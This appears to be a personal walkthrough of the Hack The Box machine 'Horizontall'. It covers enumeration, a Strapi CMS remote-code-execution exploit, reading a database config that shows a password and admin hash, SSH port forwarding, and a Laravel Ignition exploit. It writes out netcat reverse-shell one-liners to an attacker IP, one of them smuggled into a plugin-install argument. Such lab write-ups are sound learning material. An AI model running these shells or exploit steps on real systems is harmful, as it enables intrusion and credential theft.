# Horizontal

![Horizontall.png](Horizontal/Horizontall.png)

### 08/29/2021

The ip automatically resolve to horizontall.htb

![Untitled](Horizontal/Untitled.png)

Subdomains bruteforce:

![Untitled](Horizontal/Untitled%201.png)

With the directories enumeration we can discover some interesting directories like reviews, it appears to be a API.

![Untitled](Horizontal/Untitled%202.png)

Strapi api version:

![Untitled](Horizontal/Untitled%203.png)

[https://packetstormsecurity.com/files/163950/Strapi-CMS-3.0.0-beta.17.4-Remote-Code-Execution.html](https://packetstormsecurity.com/files/163950/Strapi-CMS-3.0.0-beta.17.4-Remote-Code-Execution.html)

I tested this exploit and it works well, RCE also works. 

![Untitled](Horizontal/Untitled%204.png)

Probably the connection will be done with id_rsa or interesting file, with netcat we can look the output. 

![Untitled](Horizontal/Untitled%205.png)

The command don't exit of this directory, we have to try list files and read each one.

![Untitled](Horizontal/Untitled%206.png)

Listing directory

![Untitled](Horizontal/Untitled%207.png)

CD command doesn't work. 

![Untitled](Horizontal/Untitled%208.png)

Transversal execution of linpeas.

![Untitled](Horizontal/Untitled%209.png)

Path of binaries 

![Untitled](Horizontal/Untitled%2010.png)

This reverse worked perfectly:

```java
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 1234 >/tmp/f
```

Passing the reverse to python.

![Untitled](Horizontal/Untitled%2011.png)

### Strapi is the leading open-source Headless CMS.

Database login file:

```java
cat /myapi/config/environments/development/database.json
```

![Untitled](Horizontal/Untitled%2012.png)

```java
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

![Untitled](Horizontal/Untitled%2013.png)

```java
ssh -R 1337:localhost:1337 strapi@10.10.11.105

http://localhost:1337/admin

admin    | admin@horizontall.htb | $2a$10$wZOeplNzijDtfaYGBR9wqOvD.cMMCRN4HBA7PgTkTnj0Ymvhv0e6W
drwxr-xr-x 2 root root 4096 Aug  3 21:16 /usr/share/keyrings
/usr/share/bash-completion/completions/bind

strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 1234 >/tmp/f)"
```

### Dissecting the exploit

This function verify the version of strapi that is returned by this page

![Untitled](Horizontal/Untitled%2014.png)

Reset password: note that in the response returns admin True

![Untitled](Horizontal/Untitled%2015.png)

Manually craft exploration:

![Untitled](Horizontal/Untitled%2016.png)

Calls to insert code

![Untitled](Horizontal/Untitled%2017.png)

$gt. Returns any documents that have a value that is greater than the specified value in the set. It is also referred to as the greater than comparison operator.

To make execution of commands we need of JWT token. The execution of commands is done in plugins install page, sending json code with command. 

![Untitled](Horizontal/Untitled%2018.png)

It returns forbidden because we need insert JWT in authorization header.

![Untitled](Horizontal/Untitled%2019.png)

Now authenticated with cookie, we have to create a jwt with plugin and command execution passing port 1337.

![Untitled](Horizontal/Untitled%2020.png)

Working command execution:

![Untitled](Horizontal/Untitled%2021.png)

To make port forwarding just add your pubkey in authorized_keys and runs the port forwarding using SSH. 

![Untitled](Horizontal/Untitled%2022.png)

It's a Laravel PHP v7.4.18

![Untitled](Horizontal/Untitled%2023.png)

Laravel exploit code: [https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py](https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py), this exploit discover the PATH of logs.

The second exploit execute commands:

[https://packetstormsecurity.com/files/160951/Laravel-8.4.2-Remote-Code-Execution.html](https://packetstormsecurity.com/files/160951/Laravel-8.4.2-Remote-Code-Execution.html)

After many tries  i get the command execution: in payload put between "" to execute all command.

![Untitled](Horizontal/Untitled%2024.png)

[https://www.youtube.com/watch?v=abEOdicWhNo&ab_channel=CryptoCat](https://www.youtube.com/watch?v=abEOdicWhNo&ab_channel=CryptoCat)
